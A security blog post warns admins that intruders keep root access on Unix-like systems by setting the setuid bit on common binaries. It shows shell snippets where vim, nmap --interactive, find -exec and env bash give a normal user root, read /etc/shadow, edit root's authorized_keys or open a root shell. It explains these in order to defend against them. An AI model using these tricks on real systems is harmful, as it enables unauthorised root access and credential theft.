# Don't be fooled by this kind of UNIX-like backdoors


I am seeing more and more attacks in the wild implying the use of a setuid mechanism to maintain a privileged access onto a UNIX-like system (Linux, BSD's, OSX, etc.).


## A little bit of context
---
Let's imagine your system being hacked by any kind, it could be either :
- An unfortunate weak password guess
- A malicious physical access
- A chad NSA 0day slamming your ports
- ...

{{< figure src="/images/security/unix-backdoors/don't-be-fooled-by-this-kind-of-unix-backdoors1.png" alt="a nice try nsa image" >}} 


As you are someone who knows a little bit about IT security, you successfully manage to patch your system and change all your passwords, locking out the hackers. 

You even engage an exhaustive audit of your system to know exactly what the hackers breached, when and what they may have stolen.

During your analysis, you may have spoted some tricks the hackers may have used to maintain access on your computer / server. 
Here's a small list of the most widely used tricks :

- Adding an entry to "/root/.ssh/authorized_keys"
- Creating a new user 
- Taking advantage of cron jobs.

In spite of all your efforts, chances are your system is still in the hands of your opponents. And this without you even knowing it.

There is indeed a yet subtle kind of trick that doesn't require changing any line of code, but instead uses two ideas. 

## The setuid trick
---
The first idea is to take advantage of a standard feature widely spread among most Unix-like systems.

`chmod u+s` (or setuid in english) :

>- If the "setuid bit" (or flag) is set for executable, the operating system won't run the program as the current user, but as the owner. 
>- If that executable was installed with root priviledges as it is the case for a large majority of operating systems, its owner will likely be root. 

This way, if the vim binary has the setuid bit, all users executing vim will be effectively running vim as root. 

In fact, a lot of binaries has the setuid bit by default. Take the example of "ping". Because ping creates a raw network socket, it needs to be priviledged.

Even if this sounds as the biggest security hole inside UN*X ~~since openssl~~,  it's not that scary because: 

- Ping doesn't really interact with the system (file read/write)
- Ping has to be vulnerable to such code execution flaws


## Authorized arbitrary code execution
---
Here is the second idea : a lot of binaries on UNIX-like systems will provide a way to interact with the system. 
We can take the previous example of vim wich read and write files to regain root-level access even after a lock out, if we can log in as any (non-privileged) user on the system:


## Vim
---
```sh
$ ssh random-user@target

$ cat /etc/shadow                # cat: /etc/shadow: Permission denied
$ vim /etc/shadow                # SUCCESS - can set all passwords
$ vim /root/.ssh/authorized_keys # SUCCESS - can set authorized public keys
```

## Nmap
---
I know what would you say, "where's the flaw ? This is completely normal for vim to read / write into a file !". 
Well, did you know that nmap could provide you an interactive root shell (if setuid) :

```sh
# simulate hacker with user access

$ whoami               # anyuser
$ cat /etc/shadow      # /etc/shadow: Permission denied
$ nmap --interactive
> !whoami              # root
> !cat /etc/shadow     # SUCCESS: prints out hashed passwords
> !bash                # SUCCESS: launches root shell
```

## Find
---

As well as the simple command "find" : 

```sh
$ whoami                                # anyuser
$ cat /etc/shadow                       # /etc/shadow: Permission denied
$ touch /tmp/foobar                     # create a temporary file
$ find /tmp/ -name "foobar" -exec id \; #root uid=0(root) gid=0(root) 
```
## And the winner is...
---
You are using Linux, OSX or even Solaris ? There you go : 

```sh
$ whoami           # anyuser
$ cat /etc/shadow  # /etc/shadow: Permission denied
$ env bash         # create a temporary file
$ whoami           # root
```

## Want a map ?
---
{{< figure src="/images/security/unix-backdoors/don't-be-fooled-by-this-kind-of-unix-backdoors3.jpg" alt="a world map picture" >}} 

You get it, a determined hacker could use a plethora of binaries to create invisible backdoors in the eyes of the average user.

To give you an idea, here's a curated list proudly named [GTFOBins](https://gtfobins.github.io/#). It's a list of Unix binaries that can be used to create undetectable backdoors.

## The solution
---
As this is a more conceptual debate on how to practice security, there's rather a set of best practices to observe case by case than a solution to patch all of this. 
But generally speaking : 

- Once your system has been hacked, you can't trust it anymore. You need to figure out how it was originally exploited, then restore from a known clean backup or, better start from scratch.
- Observe the golden rule of the least priviledge, don't use sudo on your personal computer / server. A user should never be administrator.
- And finally, I would recommend you to apply immediately any security update and stay tuned to official cybersecurity threats canals. [US-CERT](https://us-cert.cisa.gov/) is a good one to start as they aggregate multiple canals in one (0days, cybercriminals, etc.). Each country has its own cert so don't hesitate to visit your country CERT and see how your country uses your taxes.

{{< figure src="/images/security/unix-backdoors/don't-be-fooled-by-this-kind-of-unix-backdoors2.jpg" alt="install updates!!" >}} 


## Make a good action !
---
Hit that `CTRL + D` to bookmark this website 🔖

Internet is for sharing, so please consider sharing this post if you liked it !

It will be so much better than any newsletter #privacy #spam #planet 🌍 ❤️
